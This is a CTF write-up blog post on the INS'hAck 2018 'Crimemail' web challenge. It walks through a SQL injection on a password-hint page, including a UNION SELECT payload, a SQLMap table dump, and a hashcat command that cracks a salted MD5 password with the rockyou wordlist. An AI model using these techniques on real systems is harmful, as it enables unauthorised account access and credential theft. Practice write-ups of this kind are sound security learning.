---
layout: post
title: INS'hAck 2018 - Crimemail
author:
  name: Crisis
comments: true
---
This is the first of the two web challenges of the INS'hAck CTF that I managed to flag this weekend. Here is its descriptions:  
```
Collins Hackle is a notorious bad guy, and you've decided to take him down. You need something on him, anything, to send the police his way, and it seems he uses CrimeMail, a very specialized email service, to communicate with his associates.
Let's see if you can hack your way in his account...
Hint: his password's md5 is computed as followed: md5 = md5($password + $salt) and Collins Hackle has a password which can be found in an english dictionary
```

As you can see just reading the description already gave us some valuable informations.  
The website consisted of a simple login form to access the emails and of a "lost password" page which could give us a hint about a user's password if we provided its username:  
![website](/medias/inshack18/hintpage.png)  
  
Here we could easily guess a valid username using the challenge's description. From the name `Collins Hackle` we could try a few obvious usernames, and the right one was `c.hackle`. Using it returned an original response, but the hint was useless:  
```php
array(1) {
  [0]=>
  array(1) {
    ["hint"]=>
    string(27) "I don't need any hints man!"
  }
}
```
Since that page seemed to return a lot of informations without filtering it, the next logical step was to try a SQL Injection. A simple quote returned an error:  
```sql
Database error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1
```
After a few tries, I managed to get all the usernames with a standard injection:
```sql
bla' UNION SELECT username FROM users -- -
```
Which returned:
```sql
array(5) {
  [0]=>
  array(1) {
    ["hint"]=>
    string(9) "p.escobar"
  }
  [1]=>
  array(1) {
    ["hint"]=>
    string(7) "g.dupuy"
  }
  [2]=>
  array(1) {
    ["hint"]=>
    string(8) "a.capone"
  }
  [3]=>
  array(1) {
    ["hint"]=>
    string(8) "c.manson"
  }
  [4]=>
  array(1) {
    ["hint"]=>
    string(8) "c.hackle"
  }
}
```
As always, at that point I decided to launch [SQLMap](http://sqlmap.org/). The `--dump` flag allowed me to dump the table:  
![sqlmap](/medias/inshack18/sqlmap.png)  
  
Now it was just a matter of cracking that md5 hash. As we can see we could get the salt from the database, and we knew from the challenge's description that the salt is used after the password:
`md5($password + $salt)`. 
I used [hashcat](https://hashcat.net/hashcat/) to crack it, with the help of the classic rockyou dictionnary:
```
./hashcat -a 0 -m 10 f2b31b3a7a7c41093321d0c98c37f5ad:yhbG rockyou.txt
```
The `-a 0` flag means that we're doing a "straight" attack using a dictionnary, and the `-m 10` flag tells hashcat that it's a md5 hash and that the salt is after the password : `10 | md5($pass.$salt)`. Using that command I almost instantly got the password : `f2b31b3a7a7c41093321d0c98c37f5ad:yhbG:pizza`  
  
Then you could just log in, and get the flag:  
![flag](/medias/inshack18/flag.png)  


{% if page.comments %}
<div id="disqus_thread"></div>
<script>
var disqus_config = function () {
this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = "INSHACK18Crimemail"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://phi0-1.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript> 
{% endif %}